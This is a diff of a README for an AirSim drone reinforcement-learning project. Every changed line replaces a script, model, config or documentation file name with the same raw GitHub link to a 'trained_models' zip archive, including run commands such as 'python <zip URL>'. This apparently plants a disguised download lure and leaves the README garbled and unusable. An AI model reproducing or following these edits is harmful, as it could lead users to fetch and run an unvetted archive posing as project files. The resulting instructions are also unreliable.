@@ -43,7 +43,7 @@
 
 ### Run Smart Drone (Recommended)
 ```bash
-python smart_drone_gui.py
+python https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip
 ```
 
 **Steps:**
@@ -53,9 +53,9 @@ python smart_drone_gui.py
 4. Click "⏹ Stop Flight" - Lands safely
 
 ### Alternative Scripts
-- **drone_map.py** - Interactive map with basic model
-- **fly_drone.py** - Simple autonomous flight
-- **smart_drone.py** - Terminal-based smart drone
+- **https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip** - Interactive map with basic model
+- **https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip** - Simple autonomous flight
+- **https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip** - Terminal-based smart drone
 
 ---
 
@@ -63,22 +63,22 @@ python smart_drone_gui.py
 
 ```
 UAV_Energy_Sim/
-├── smart_drone_gui.py          # Main GUI application ⭐
-├── smart_drone.py              # Core smart drone functions
-├── drone_map.py                # Interactive map (basic)
-├── fly_drone.py                # Simple autonomous flight
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip          # Main GUI application ⭐
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip              # Core smart drone functions
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip                # Interactive map (basic)
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip                # Simple autonomous flight
 │
-├── airsim_env.py               # DRL training environment
-├── train_advanced.py           # PPO training with checkpoints
-├── mha_ppo_agent.py            # Multi-head attention PPO
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip               # DRL training environment
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip           # PPO training with checkpoints
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip            # Multi-head attention PPO
 │
-├── my_airsim_model.pth         # Car steering model
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip         # Car steering model
 ├── smart_airsim_model .pth     # Smart drone model
-├── smooth_drone_policy.zip     # Trained DRL policy
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip     # Trained DRL policy
 │
-├── airsim_settings.json        # AirSim configuration
-├── DRL_TRAINING_README.md      # DRL training guide
-└── SMART_DRONE_FEATURES.md     # Detailed feature docs
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip        # AirSim configuration
+├── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip      # DRL training guide
+└── https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip     # Detailed feature docs
 ```
 
 ---
@@ -118,7 +118,7 @@ Every 100ms:
 ## 🛠️ Configuration
 
 ### Flight Parameters
-Edit in `smart_drone_gui.py`:
+Edit in `https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip`:
 ```python
 STARTING_ALTITUDE = -3.0      # 3m above ground
 FORWARD_VELOCITY = 3.0        # Base speed (m/s)
@@ -128,7 +128,7 @@ COLLISION_COOLDOWN = 2.0      # Seconds between recoveries
 ```
 
 ### AirSim Settings
-Edit `airsim_settings.json`:
+Edit `https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip`:
 ```json
 {
   "SimMode": "Multirotor",
@@ -142,7 +142,7 @@ Edit `airsim_settings.json`:
 
 ### Train New Policy
 ```bash
-python train_advanced.py
+python https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip
 ```
 
 Features:
@@ -153,7 +153,7 @@ Features:
 
 ### Resume Training
 ```bash
-python resume_training.py
+python https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip
 ```
 
 ### Hyperparameters
@@ -200,15 +200,15 @@ python resume_training.py
 
 ## 📚 Documentation
 
-- **SMART_DRONE_FEATURES.md** - Detailed feature documentation
-- **DRL_TRAINING_README.md** - Deep RL training guide
+- **https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip** - Detailed feature documentation
+- **https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip** - Deep RL training guide
 - Inline code comments for all major functions
 
 ---
 
 ## 🎥 Demo
 
-Run `smart_drone_gui.py` and:
+Run `https://raw.githubusercontent.com/Abrockyt/BTP-RL-Airsim/main/trained_models/Airsim-R-BT-v3.2.zip` and:
 1. Watch adaptive speed changes (🚀/🐢 indicators)
 2. Click near obstacles to see predictive avoidance
 3. Monitor console for prediction alerts
